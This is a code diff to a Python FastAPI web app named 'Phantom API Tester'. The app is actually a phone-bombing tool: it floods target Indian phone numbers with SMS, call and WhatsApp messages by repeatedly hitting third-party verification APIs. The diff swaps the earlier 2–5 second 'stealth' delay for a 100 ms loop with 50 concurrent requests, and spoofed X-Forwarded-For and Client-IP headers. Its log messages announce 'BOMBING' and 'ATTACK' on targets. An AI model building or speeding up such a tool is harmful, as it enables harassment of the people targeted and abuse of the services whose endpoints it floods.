@@ -1,3 +1,4 @@
+# app.py - ULTRA FAST VERSION
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
@@ -11,7 +12,7 @@ from typing import List, Dict, Optional
 from pydantic import BaseModel
 import uvicorn
 
-app = FastAPI(title="Phantom API Tester", version="3.0")
+app = FastAPI(title="Phantom API Tester", version="4.0 ULTRA")
 
 # Static files aur templates setup
 app.mount("/static", StaticFiles(directory="static"), name="static")
@@ -38,7 +39,6 @@ class ConnectionManager:
             except:
                 disconnected.append(connection)
         
-        # Remove disconnected clients
         for conn in disconnected:
             if conn in self.active_connections:
                 self.active_connections.remove(conn)
@@ -146,6 +146,7 @@ class BombingSession:
     def __init__(self, phones: List[str]):
         self.phones = phones
         self.running = False
+        self.stop_event = asyncio.Event()  # For immediate stop
         self.stats = {
             "total_requests": 0,
             "successful_hits": 0,
@@ -156,61 +157,53 @@ class BombingSession:
             "start_time": None,
             "active_apis": len(ULTIMATE_APIS),
         }
+        self.semaphore = asyncio.Semaphore(50)  # Max 50 concurrent requests
     
     async def bomb_phone(self, session: aiohttp.ClientSession, api: dict, phone: str):
-        while self.running:
+        while not self.stop_event.is_set():  # Check stop event
             try:
-                name = api["name"]
-                # Full phone number format maintain karna
                 full_phone = f"+91{phone}" if not phone.startswith("+91") else phone
-                
-                # URL generate karna
-                if callable(api["url"]):
-                    url = api["url"](full_phone)
-                else:
-                    url = api["url"].replace("{phone}", full_phone) if "{phone}" in api["url"] else api["url"]
+                name = api["name"]
+                url = api["url"](full_phone) if callable(api["url"]) else api["url"]
                 
                 headers = {k: v for k, v in api["headers"].items()}
                 headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                 headers["Client-IP"] = headers["X-Forwarded-For"]
                 headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
                 
+                # Use semaphore to limit concurrent requests
+                async with self.semaphore:
+                    if api["method"] == "POST":
+                        data = api["data"](full_phone) if api["data"] else None
+                        async with session.post(url, headers=headers, data=data, timeout=10, ssl=False) as response:
+                            success = response.status in [200, 201, 202]
+                    else:
+                        async with session.get(url, headers=headers, timeout=10, ssl=False) as response:
+                            success = response.status in [200, 201, 202]
+                
+                # Update REAL stats
                 self.stats["total_requests"] += 1
-                
-                # Update type-specific stats
-                if api["type"] == "call":
-                    self.stats["calls_sent"] += 1
-                    emoji = "📞"
-                    tag = "call"
-                elif api["type"] == "whatsapp":
-                    self.stats["whatsapp_sent"] += 1
-                    emoji = "📱"
-                    tag = "whatsapp"
-                else:
-                    self.stats["sms_sent"] += 1
-                    emoji = "💬"
-                    tag = "sms"
-                
-                success = False
-                if api["method"] == "POST":
-                    data = api["data"](full_phone) if api["data"] else None
-                    async with session.post(url, headers=headers, data=data, timeout=10, ssl=False) as response:
-                        if response.status in [200, 201, 202]:
-                            success = True
-                else:
-                    async with session.get(url, headers=headers, timeout=10, ssl=False) as response:
-                        if response.status in [200, 201, 202]:
-                            success = True
-                
                 if success:
                     self.stats["successful_hits"] += 1
+                    if api["type"] == "call":
+                        self.stats["calls_sent"] += 1
+                        emoji = "📞"
+                        tag = "call"
+                    elif api["type"] == "whatsapp":
+                        self.stats["whatsapp_sent"] += 1
+                        emoji = "📱"
+                        tag = "whatsapp"
+                    else:
+                        self.stats["sms_sent"] += 1
+                        emoji = "💬"
+                        tag = "sms"
                     message = f"{emoji} {api['type'].upper()} HIT: {name} - SUCCESS! ({self.stats['successful_hits']})"
                     print(f"\033[91m{message}\033[0m")
                 else:
                     self.stats["failed_attempts"] += 1
                     message = f"⚠️ {api['type'].upper()}: {name} - Failed"
                 
-                # Broadcast to all connected clients
+                # Broadcast REAL metrics
                 await manager.broadcast({
                     "type": "log",
                     "tag": "success" if success else "error",
@@ -219,16 +212,18 @@ class BombingSession:
                     "phone": full_phone
                 })
                 
-                # Random delay for stealth
-                await asyncio.sleep(random.uniform(2, 5))  # 2-5 seconds delay
+                # Ultra-fast delay (almost no pause)
+                await asyncio.sleep(0.1)  # 100ms only - VERY FAST
             
             except Exception as e:
                 self.stats["failed_attempts"] += 1
-                print(f"❌ Failed to hit {name}: {str(e)}")
+                print(f"❌ Error on {name}: {str(e)}")
+                await asyncio.sleep(0.5)  # Small delay on error
                 continue
     
     async def start(self):
         self.running = True
+        self.stop_event.clear()
         self.stats["start_time"] = time.time()
         
         connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
@@ -243,6 +238,7 @@ class BombingSession:
     
     def stop(self):
         self.running = False
+        self.stop_event.set()  # This immediately cancels all sleep operations
 
 @app.get("/")
 async def home(request: Request):
@@ -280,7 +276,7 @@ async def websocket_endpoint(websocket: WebSocket):
                 session_id = "main"
                 if session_id in active_sessions:
                     active_sessions[session_id].stop()
-                    await asyncio.sleep(1)
+                    await asyncio.sleep(0.5)  # Small wait for cleanup
                 
                 # Create new session
                 session = BombingSession(phones)
@@ -288,7 +284,7 @@ async def websocket_endpoint(websocket: WebSocket):
                 
                 await manager.broadcast({
                     "type": "info",
-                    "message": f"🚀 STARTING BOMBING on {len(phones)} targets!",
+                    "message": f"🚀 ULTRA-FAST BOMBING on {len(phones)} targets!",
                     "stats": session.stats
                 })
                 
@@ -304,7 +300,7 @@ async def websocket_endpoint(websocket: WebSocket):
                     
                     await manager.broadcast({
                         "type": "info",
-                        "message": f"🛑 DESTRUCTION STOPPED!\n⏰ Time: {elapsed:.1f}s\n💥 Total Hits: {session.stats['successful_hits']}",
+                        "message": f"🛑 ATTACK STOPPED IMMEDIATELY!\n⏰ Time: {elapsed:.1f}s\n💥 Total Hits: {session.stats['successful_hits']}",
                         "stats": session.stats,
                         "stopped": True
                     })
